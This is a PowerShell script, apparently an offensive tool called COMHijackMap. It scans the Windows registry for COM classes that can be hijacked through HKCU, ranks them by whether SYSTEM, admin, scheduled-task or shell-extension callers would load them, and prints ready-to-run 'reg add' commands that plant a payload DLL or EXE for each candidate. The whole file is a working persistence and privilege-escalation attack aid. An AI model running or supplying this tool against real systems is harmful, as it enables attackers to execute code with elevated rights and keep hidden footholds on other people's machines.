$ErrorActionPreference = 'SilentlyContinue'
Set-StrictMode -Off

function Get-ProcessOwner {
    param([int]$Pid)
    try {
        $p = Get-CimInstance Win32_Process -Filter "ProcessId=$Pid" -ErrorAction Stop
        $o = $p.GetOwner()
        if ($o.ReturnValue -eq 0) { return "$($o.Domain)\$($o.User)" }
    } catch {}
    return 'Unknown'
}

function Get-PrivLevel {
    param([string]$Owner)
    if ($Owner -match '(?i)SYSTEM|TrustedInstaller|NETWORK SERVICE|LOCAL SERVICE') { return 'SYSTEM' }
    if ($Owner -match '(?i)Administrator') { return 'Admin' }
    return 'User'
}

function Get-Score {
    param($f)
    $s = 0
    foreach ($inv in $f.Invokers) {
        if ($inv.Priv -eq 'SYSTEM') { $s += 3 }
        elseif ($inv.Priv -eq 'Admin') { $s += 2 }
        else { $s += 1 }
        if ($inv.Type -eq 'ScheduledTask') { $s += 2 }
        if ($inv.Type -eq 'ShellExtension') { $s += 1 }
    }
    return $s
}

Write-Host "[*] Building HKCU CLSID exclusion set..." -ForegroundColor DarkGray

$hkcuCLSIDs = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
foreach ($hkcuBase in @('HKCU:\SOFTWARE\Classes\CLSID','HKCU:\SOFTWARE\WOW6432Node\Classes\CLSID')) {
    if (Test-Path $hkcuBase) {
        Get-ChildItem $hkcuBase -ErrorAction SilentlyContinue |
            ForEach-Object { [void]$hkcuCLSIDs.Add($_.PSChildName) }
    }
}

Write-Host "[*] Enumerating HKLM CLSIDs..." -ForegroundColor DarkGray

$clsidMap   = [System.Collections.Generic.Dictionary[string,PSCustomObject]]::new([System.StringComparer]::OrdinalIgnoreCase)
$dllToCLSID = [System.Collections.Generic.Dictionary[string,System.Collections.Generic.List[string]]]::new([System.StringComparer]::OrdinalIgnoreCase)

$hklmBases = @(
    @{ Path='HKLM:\SOFTWARE\Classes\CLSID';                     Arch='x64' },
    @{ Path='HKLM:\SOFTWARE\WOW6432Node\Classes\CLSID';         Arch='x86' }
)

foreach ($base in $hklmBases) {
    if (-not (Test-Path $base.Path)) { continue }
    Get-ChildItem $base.Path -ErrorAction SilentlyContinue | ForEach-Object {
        $clsid = $_.PSChildName
        if ($clsid -notmatch '^\{[0-9A-Fa-f\-]{36}\}$') { return }
        if ($hkcuCLSIDs.Contains($clsid))               { return }
        if ($clsidMap.ContainsKey($clsid))               { return }

        $dispName = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).'(default)'

        $inprocPath = "$($_.PSPath)\InprocServer32"
        if (Test-Path $inprocPath) {
            $props   = Get-ItemProperty $inprocPath -ErrorAction SilentlyContinue
            $dll     = $props.'(default)'
            $thread  = "$($props.ThreadingModel)"
            if ($dll) {
                $dll = [System.Environment]::ExpandEnvironmentVariables($dll).Trim('"').Trim("'")
                $clsidMap[$clsid] = [PSCustomObject]@{
                    CLSID      = $clsid
                    Name       = "$dispName"
                    ServerType = 'InprocServer32'
                    Server     = $dll
                    Threading  = $thread
                    Arch       = $base.Arch
                    Invokers   = [System.Collections.Generic.List[PSCustomObject]]::new()
                }
                $k = $dll.ToLower()
                if (-not $dllToCLSID.ContainsKey($k)) {
                    $dllToCLSID[$k] = [System.Collections.Generic.List[string]]::new()
                }
                $dllToCLSID[$k].Add($clsid)
            }
            return
        }

        $localPath = "$($_.PSPath)\LocalServer32"
        if (Test-Path $localPath) {
            $exe = (Get-ItemProperty $localPath -ErrorAction SilentlyContinue).'(default)'
            if ($exe) {
                $exe = [System.Environment]::ExpandEnvironmentVariables($exe).Trim('"').Trim("'")
                $clsidMap[$clsid] = [PSCustomObject]@{
                    CLSID      = $clsid
                    Name       = "$dispName"
                    ServerType = 'LocalServer32'
                    Server     = $exe
                    Threading  = 'N/A'
                    Arch       = $base.Arch
                    Invokers   = [System.Collections.Generic.List[PSCustomObject]]::new()
                }
            }
        }
    }
}

Write-Host "[*] $($clsidMap.Count) hijackable CLSIDs (in HKLM, absent from HKCU)" -ForegroundColor DarkGray

Write-Host "[*] Correlating to running processes..." -ForegroundColor DarkGray

Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
    $proc = $_
    try {
        foreach ($mod in $proc.Modules) {
            $k = $mod.FileName.ToLower()
            if (-not $dllToCLSID.ContainsKey($k)) { continue }
            foreach ($clsid in $dllToCLSID[$k]) {
                if (-not $clsidMap.ContainsKey($clsid)) { continue }
                $owner = Get-ProcessOwner $proc.Id
                $clsidMap[$clsid].Invokers.Add([PSCustomObject]@{
                    Type   = 'Process'
                    Name   = $proc.ProcessName
                    PID    = $proc.Id
                    Owner  = $owner
                    Priv   = Get-PrivLevel $owner
                    Detail = $mod.FileName
                })
            }
        }
    } catch {}
}

Write-Host "[*] Correlating to scheduled tasks..." -ForegroundColor DarkGray

try {
    foreach ($task in (Get-ScheduledTask -ErrorAction Stop)) {
        foreach ($action in $task.Actions) {
            $clsid = $null
            try { $clsid = $action.ClassId } catch {}
            if (-not $clsid -or -not $clsidMap.ContainsKey($clsid)) { continue }

            $runAs = 'Unknown'
            try { $runAs = $task.Principal.UserId } catch {}
            if ([string]::IsNullOrWhiteSpace($runAs)) { $runAs = 'Unknown' }

            $trigger = 'Unknown'
            try { $trigger = ($task.Triggers | Select-Object -First 1).TriggerType } catch {}

            $clsidMap[$clsid].Invokers.Add([PSCustomObject]@{
                Type   = 'ScheduledTask'
                Name   = "$($task.TaskPath)$($task.TaskName)"
                PID    = 0
                Owner  = $runAs
                Priv   = Get-PrivLevel $runAs
                Detail = "Trigger: $trigger"
            })
        }
    }
} catch {}

Write-Host "[*] Correlating to shell extensions..." -ForegroundColor DarkGray

$shellPaths = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved',
    'HKLM:\SOFTWARE\Classes\*\shellex\ContextMenuHandlers',
    'HKLM:\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers',
    'HKLM:\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers',
    'HKLM:\SOFTWARE\Classes\Directory\Background\shellex\ContextMenuHandlers',
    'HKLM:\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers',
    'HKLM:\SOFTWARE\Classes\*\shellex\PropertySheetHandlers',
    'HKLM:\SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers'
)

foreach ($sp in $shellPaths) {
    if (-not (Test-Path $sp -ErrorAction SilentlyContinue)) { continue }
    try {
        $item = Get-Item $sp -ErrorAction Stop
        foreach ($prop in $item.Property) {
            $val = (Get-ItemProperty $sp -Name $prop -ErrorAction SilentlyContinue).$prop
            if ($val -match '^\{[0-9A-Fa-f\-]{36}\}$' -and $clsidMap.ContainsKey($val)) {
                $clsidMap[$val].Invokers.Add([PSCustomObject]@{
                    Type   = 'ShellExtension'
                    Name   = 'Explorer.exe'
                    PID    = 0
                    Owner  = 'NT AUTHORITY\INTERACTIVE'
                    Priv   = 'User'
                    Detail = "Approved ext: $prop"
                })
            }
        }
        Get-ChildItem $sp -ErrorAction SilentlyContinue | ForEach-Object {
            $val = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).'(default)'
            if ($val -match '^\{[0-9A-Fa-f\-]{36}\}$' -and $clsidMap.ContainsKey($val)) {
                $clsidMap[$val].Invokers.Add([PSCustomObject]@{
                    Type   = 'ShellExtension'
                    Name   = 'Explorer.exe'
                    PID    = 0
                    Owner  = 'NT AUTHORITY\INTERACTIVE'
                    Priv   = 'User'
                    Detail = "Handler key: $($_.PSChildName) in $sp"
                })
            }
        }
    } catch {}
}

Write-Host "[*] Correlating to services..." -ForegroundColor DarkGray

try {
    Get-CimInstance Win32_Service -ErrorAction Stop | ForEach-Object {
        $svc = $_
        $raw = $svc.PathName
        if ([string]::IsNullOrWhiteSpace($raw)) { return }
        $raw = [System.Environment]::ExpandEnvironmentVariables($raw)
        $k   = $raw.ToLower().Trim('"').Trim("'")
        if (-not $dllToCLSID.ContainsKey($k)) { return }
        foreach ($clsid in $dllToCLSID[$k]) {
            if (-not $clsidMap.ContainsKey($clsid)) { continue }
            $owner = "$($svc.StartName)"
            $clsidMap[$clsid].Invokers.Add([PSCustomObject]@{
                Type   = 'Service'
                Name   = $svc.Name
                PID    = $svc.ProcessId
                Owner  = $owner
                Priv   = Get-PrivLevel $owner
                Detail = "State: $($svc.State)"
            })
        }
    }
} catch {}

$findings = $clsidMap.Values | Where-Object { $_.Invokers.Count -gt 0 }
$sorted   = $findings |
    ForEach-Object { [PSCustomObject]@{ F=$_; S=(Get-Score $_) } } |
    Sort-Object S -Descending |
    Select-Object -ExpandProperty F

Write-Host ""
Write-Host "=== COMHijackMap ===" -ForegroundColor Cyan
Write-Host ""

if ($sorted.Count -eq 0) {
    Write-Host "No correlated candidates found." -ForegroundColor Green
    Write-Host "Process module enumeration may be limited by integrity level." -ForegroundColor DarkGray
    Write-Host "Task and shell extension correlation still ran." -ForegroundColor DarkGray
    exit 0
}

$dedup = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

foreach ($f in $sorted) {
    $topPriv = 'User'
    foreach ($inv in $f.Invokers) {
        if ($inv.Priv -eq 'SYSTEM') { $topPriv = 'SYSTEM'; break }
        if ($inv.Priv -eq 'Admin')  { $topPriv = 'Admin' }
    }

    $color = switch ($topPriv) { 'SYSTEM' { 'Red' } 'Admin' { 'Yellow' } default { 'Cyan' } }
    $label = switch ($topPriv) { 'SYSTEM' { '[SYSTEM]' } 'Admin' { '[ADMIN] ' } default { '[USER]  ' } }

    Write-Host "$label $($f.CLSID)" -ForegroundColor $color
    if ($f.Name -and $f.Name.Trim()) { Write-Host "  Name      : $($f.Name)" }
    Write-Host "  Type      : $($f.ServerType) [$($f.Arch)]"
    Write-Host "  Server    : $($f.Server)"
    if ($f.Threading -and $f.Threading -ne 'N/A') { Write-Host "  Threading : $($f.Threading)" }

    $uniqInvokers = $f.Invokers | Group-Object { "$($_.Type)|$($_.Name)|$($_.Owner)" } | ForEach-Object { $_.Group[0] }
    Write-Host "  Invokers  :" -ForegroundColor DarkGray
    foreach ($inv in $uniqInvokers) {
        $line = "    [$($inv.Type.PadRight(13))] $($inv.Name) as $($inv.Owner)"
        if ($inv.Detail) { $line += " | $($inv.Detail)" }
        Write-Host $line -ForegroundColor DarkGray
    }

    $clsidKey = "HKCU\SOFTWARE\Classes\CLSID\$($f.CLSID)"
    Write-Host "  Plant     :" -ForegroundColor Green
    if ($f.ServerType -eq 'InprocServer32') {
        $thread = if ($f.Threading -and $f.Threading -ne '') { $f.Threading } else { 'Apartment' }
        Write-Host "    reg add `"$clsidKey\InprocServer32`" /ve /d `"C:\programdata\payload.dll`" /f" -ForegroundColor Green
        Write-Host "    reg add `"$clsidKey\InprocServer32`" /v ThreadingModel /d `"$thread`" /f" -ForegroundColor Green
    } else {
        Write-Host "    reg add `"$clsidKey\LocalServer32`" /ve /d `"C:\programdata\payload.exe`" /f" -ForegroundColor Green
    }
    Write-Host "  Undo      :" -ForegroundColor DarkGray
    Write-Host "    reg delete `"$clsidKey`" /f" -ForegroundColor DarkGray
    Write-Host ""
}

$sysCount  = ($sorted | Where-Object { $_.Invokers | Where-Object { $_.Priv -eq 'SYSTEM' } }).Count
$taskCount = ($sorted | Where-Object { $_.Invokers | Where-Object { $_.Type -eq 'ScheduledTask' } }).Count
$shellCount= ($sorted | Where-Object { $_.Invokers | Where-Object { $_.Type -eq 'ShellExtension' } }).Count
$svcCount  = ($sorted | Where-Object { $_.Invokers | Where-Object { $_.Type -eq 'Service' } }).Count

Write-Host "Total    : $($sorted.Count)" -ForegroundColor DarkGray
Write-Host "SYSTEM   : $sysCount" -ForegroundColor DarkGray
Write-Host "Task     : $taskCount" -ForegroundColor DarkGray
Write-Host "Shell    : $shellCount" -ForegroundColor DarkGray
Write-Host "Service  : $svcCount" -ForegroundColor DarkGray
